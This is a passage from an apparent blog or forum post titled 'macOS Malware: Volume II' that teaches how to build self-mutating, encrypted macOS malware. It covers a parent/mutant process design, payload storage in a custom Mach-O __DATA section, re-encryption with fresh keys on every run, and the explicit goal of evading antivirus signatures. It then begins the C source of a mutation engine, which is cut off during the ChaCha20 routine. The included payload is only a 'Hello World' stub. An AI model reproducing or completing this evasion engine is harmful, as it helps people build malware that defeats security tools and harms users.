description = "Today’s post is about writing fully custom malware targeting macOS.  We’ll walk through its architecture, mutation techniques, and anti-analysis methods, with a focus on Mach-O internals and Darwin APIs. If you know anything about me, you know I love writing self-modifying code even though it never works (skill issue).  This piece covers some known techniques and isn’t here to hand you malware, so don’t get it twisted. There’s nothing fancy or groundbreaking here just the basics that anyone with..."
full_description = 'macOS Malware: Volume II Malware malware, macos 0xf00I February 14, 2025, 8:15pm 1 Today’s post is about writing fully custom malware targeting macOS. We’ll walk through its architecture, mutation techniques, and anti-analysis methods, with a focus on Mach-O internals and Darwin APIs. If you know anything about me, you know I love writing self-modifying code even though it never works (skill issue). This piece covers some known techniques and isn’t here to hand you malware, so don’t get it twisted. There’s nothing fancy or groundbreaking here just the basics that anyone with some free time can mess around with. “macOS is no exception; it’s not malware-proof.” Some familiarity with malware development is expected. I don’t care if you’re using Linux or Windows techniques may vary, but the core concepts remain the same: debugging and working with low-level programming. If you’re new to macOS, check out the first article for the basics; it’ll prepare you for what’s coming. The main reason for this piece was my long-term interest in macOS internals and, more specifically, macOS malware and, most importantly, to have fun and learn something new! As always, I will try to explain everything as compactly and clearly as possible. We’ll break down detailed, step-by-step code and techniques so you can follow along and fully understand the concepts at hand. References: Executing Mach-Os In-Memory ----[T H E - A R C H I T E C T U R E] The code examples and concepts presented here have been tested on macOS 14+ (Sonoma), including ARM-based systems. However, I cannot guarantee compatibility across all configurations. That said, if there are better sources available for explaining something, I’ll reference those while striving to be thorough in documenting sources. One more thing: I’m going to split this into smaller code stubs so it’s easier to demonstrate each technique as we go along. Self-mutating code is a class of techniques that dynamically modifies its own code at runtime. This implementation, designed for macOS, leverages the Mach-O executable format and system APIs, using a custom section within the __DATAsegment to store and evolve its payload. The architecture is divided into two distinct phases: Parent Process: Responsible for initialization, decryption, mutation, re-encryption, and self-saving of the updated payload. During this phase, the engine generates encryption keys, decrypts the stored payload, mutates it (through instruction swapping and junk insertion), and then re-encrypts it with fresh keys. Capstone is used to disassemble and verify the mutated code, ensuring that every change results in valid instructions. Mutant Process: Executes the core functionality by running the evolved, self-modified code. This process takes the dynamically updated payload from the Parent Process and executes it, allowing the engine’s behavior to continuously evolve with each run after certain conditions are met. The core idea behind the malware is that it can alter its own code, encrypting its payload within the code. The payload is decrypted and executed at runtime a form of polymorphism. Let’s not jump the gun, though. We will dissect the core principles behind the mutation, its internal workings, and the techniques it uses to persist. Of course, all of this is part of our macOS malware development series, so stick around you may learn something new. ╔═════════════════════════════════════════════════════════════╗ ║ INITIAL DESIGN ║ ╠═════════════════════════════════════════════════════════════╣ ║ 1. Validate Execution Environment ║ ║ ├─ If running outside /tmp (~/Downloads): ║ ║ │ └─ Copy self to /tmp and exec the copy ║ ║ └─ Else: ║ ║ └─ Self-destruct ║ ║ ║ ║ 2. Read encrypted payload and header from __DATA section ║ ║ 3. Payload ║ ║ ├─ If first run: ║ ║ │ └─ Initialize payload (NOPs + payload), encrypt it, ║ ║ │ update header (count = 1) ║ ║ └─ Else: ║ ║ ├─ Decrypt payload ║ ║ ├─ Verify payload integrity (SHA‑256 hash) ║ ║ ├─ Mutate payload (via disassembly-based mutation) ║ ║ ├─ Generate new AES keys/IVs and re–encrypt payload ║ ║ └─ Write updated header and payload back to binary ║ ║ ║ ║ 4. Load the decrypted payload ║ ║ 5. Execute the payload (performs its task then ...) ║ ║ 6. Mutation Cycle: ║ ║ - On next run, the mutation cycle repeats or die ║ ╚═════════════════════════════════════════════════════════════╝ But first, let’s break down what Signatures are. A signature is simply a pattern of bytes that antivirus software uses to detect malicious files. It could be a string, a small piece of code, or a hash anything that helps identify bad files. To bypass this, encryption is often used so that the antivirus software can’t match it with known signatures. Then there’s the Payload, which is the actual file hidden by encryption. It doesn’t exist on its own; it’s attached to the Stub in some form. This might mean it’s stored as a resource, appended to the end of a file, or placed in a new or existing section (more on this as we go). The Stub is a small piece with one task: decrypt the payload and run it in memory. Since the payload is encrypted, antivirus can’t detect it directly, so it targets the stub instead. But the stub is tiny and simple, making it easy to modify, which allows it to avoid detection repeatedly. So, what’s the move? There are multiple roads to take here. On one hand, you could stick with a minimal, straightforward self‑modifying loader. This approach would be small, easy to write, and simple to maintain. It would apply a modest mutation perhaps just a couple of simple modifications that can be tweaked with minimal effort. The upside is that your code remains lean and easy to understand (at least by you). “What starts as polymorphic finishes as metamorphic.” On the flip side, you could go full‑on metamorphic. In this model, the loader doesn’t just perform one or two simple modifications; it completely reshapes itself from generation to generation. Each time it runs, it produces a brand new instance with a unique layout, instruction sequence, and encryption signature. This means that even if an antivirus or reverse engineer captures one instance, the next run might look entirely different, making signature‑based detection a moving target. See: The Art of Self-Mutating Malware Of course, this comes with its own set of challenges. As I mentioned, the complexity of ensuring that each transformation preserves its functionality is very high. For that, we need heuristics (like validating instruction counts, checking branches, and so on) to ensure that the changes don’t break the code. This article isn’t entirely about mutation, but since it’s part of our design, here’s a little example to get your feet wet. It’s similar to how our engine works (I won’t spill all the details here you can find the full engine on GitHub), but this snippet should give you a solid idea. Keep in mind, it’s only half done. “This is bad coding.” mutator.c /* 0x00f */ // // Inc // #include <stdio.h> #include <stdlib.h> #include <fcntl.h> #include <unistd.h> #include <string.h> #include <sys/random.h> #include <sys/mman.h> #include <sys/stat.h> #include <sys/types.h> #include <stdint.h> #include <errno.h> #include <signal.h> #include <stdbool.h> #include <time.h> // #include <sys/wait.h> #include <mach-o/dyld.h> #include <mach-o/getsect.h> #include <mach-o/loader.h> #include <capstone/capstone.h> #include <CommonCrypto/CommonCryptor.h> #include <CommonCrypto/CommonDigest.h> // // Macros // #define K 32 #define S 30 // STUB #define J 16 // JUNK #define MU 2 // MUTATION #define P 4096 // // Structures // typedef struct __attribute__((packed)) { uint8_t key[K], iv[kCCBlockSizeAES128]; uint64_t seed; uint32_t count; uint8_t hash[CC_SHA256_DIGEST_LENGTH], hmac[CC_SHA256_DIGEST_LENGTH]; } Encryption; typedef struct { uint8_t key[K], iv[12], stream[64]; size_t position; uint64_t counter; } ChaCha; typedef struct { csh handle; cs_insn *insns; size_t count; uint8_t *original; size_t size; ChaCha rng; } Evolution; // https://developer.apple.com/library/archive/documentation/Performance/Conceptual/CodeFootprint/Articles/MachOOverview.html extern struct mach_header_64 _mh_execute_header; __attribute__((used, section("__DATA,__fdata"))) static uint8_t data[sizeof(Encryption) + P]; // https://github.com/capstone-engine/capstone #if defined(__x86_64__) #define ARCH_X86 1 #define ARC CS_ARCH_X86 #define MODE CS_MODE_64 #include <capstone/x86.h> #elif defined(__arm64__) #define ARCH_ARM 1 #define ARC CS_ARCH_ARM64 #define MODE 0 #include <capstone/arm64.h> #else #error "" #endif // // Dummy Payload // const uint8_t dummy[] = { 0xeb, 0x1e, // jmp 0x1e 0x5e, // pop rsi 0xb8, 0x04, 0x00, 0x00, 0x02, // mov eax, 4 (write) 0xbf, 0x01, 0x00, 0x00, 0x00, // mov edi, 1 (stdout) 0xba, 0x0e, 0x00, 0x00, 0x00, // mov edx, 0x0e 0x0f, 0x05, // syscall 0xb8, 0x01, 0x00, 0x00, 0x02, // mov eax, 1 0xbf, 0x00, 0x00, 0x00, 0x00, // mov edi, 0 (exit) 0x0f, 0x05, // syscall 0xe8, 0xdd, 0xff, 0xff, 0xff, // call back to jmp 0x48, 0x65, 0x6c, 0x6c, 0x6f, 0x20, 0x57, 0x6f, 0x72, 0x6c, 0x64, 0x21, 0x0d, 0x0a }; const size_t len = sizeof(dummy); // // Macros (for ChaCha20) // // heard MacOS prefers it // https://github.com/aead/chacha20 #define ROTL32(x, n) (((x) << (n)) | ((x) >> (32 - (n)))) #define QR(a, b, c, d) (a += b, d ^= a, d = ROTL32(d, 16), \ c += d, b ^= c, b = ROTL32(b, 12), \ a += b, d ^= a, d = ROTL32(d, 8), \ c += d, b ^= c, b = ROTL32(b, 7)) // // Routines // void chacha20_block(const uint32_t key[8], uint32_t counter, const uint32_t nonce[3], uint32_t out[16]) { uint32_t state[16], orig[16], c[4] = {0x61707865, 0x3320646e, 0x79622d32, 0x6B206574}; state[0] = c[0]; state[1] = c[1]; state[2] = c[2]; state[3] = c[3]; memcpy(&state[4], key, 32); state[12] = counter; memcpy(&state[13], nonce, 12); memcpy(orig, state, sizeof(state)); for (int i = 0; i < 10; i++) { QR(state[0], state[4], state[8], state[12]); QR(state[1], state[5], state[9], stat